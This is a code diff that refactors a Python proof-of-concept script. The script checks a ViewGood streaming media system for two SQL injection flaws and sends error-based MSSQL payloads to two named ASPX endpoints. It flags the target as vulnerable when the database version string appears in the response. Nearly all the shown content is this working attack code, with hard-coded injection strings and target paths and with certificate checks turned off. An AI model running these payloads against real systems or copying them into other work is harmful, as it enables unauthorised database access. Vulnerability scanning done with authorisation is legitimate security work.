@@ -10,14 +10,7 @@ import sys
 import json
 import requests
 import warnings
-
-  
-
-class two_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['古流媒体系统两处SQL注入','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -26,14 +19,14 @@ class two_sqli:
             "user_name":"'AnD(Db_Name()+ChAr(66)+ChAr(66)+ChAr(66)+@@VeRSioN)>0--"
         }
         payload = "/viewgood/Pc/Content/Request.aspx?action=name_check"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"BBBMicrosoft" in req.text:
                 result[2]=  '存在'
                 result[1] = vulnurl+"\tpost: "+json.dumps(post_data)
                 return result
-            vulnurl = self.url + "/VIEWGOOD/ADI/portal/UserDataSync.aspx"
+            vulnurl = url + "/VIEWGOOD/ADI/portal/UserDataSync.aspx"
             post_data = {
                 "UserGUID":"1'AnD(Db_Name()+ChAr(66)+ChAr(66)+ChAr(66)+@@VeRSioN)>0--"
             }
@@ -51,5 +44,5 @@ class two_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = two_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
